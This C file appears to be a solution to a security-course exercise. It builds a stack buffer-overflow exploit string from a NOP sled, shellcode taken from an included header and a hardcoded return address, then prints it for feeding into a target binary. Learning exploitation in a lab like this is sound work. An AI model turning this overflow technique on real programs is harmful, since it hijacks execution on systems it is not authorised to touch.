#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running "<target> $(sploit)"
 * in your terminal.
 */

const char NOP = '\x90';

int main(void) {
    char exploit[250] = {0};
    char jump_addr[] = "\x9c\x04\x80\x40";

    for (size_t i = 0;
        i < (sizeof(exploit)-sizeof(shellcode) - sizeof(jump_addr));
        i++){
        exploit[i] = NOP;
        }

    strncat(exploit,shellcode,sizeof(exploit)-strlen(exploit)-1);

    strncat(exploit, jump_addr, sizeof(exploit) - strlen(exploit) - 1);

    printf("%s", exploit);

    return 0;
}
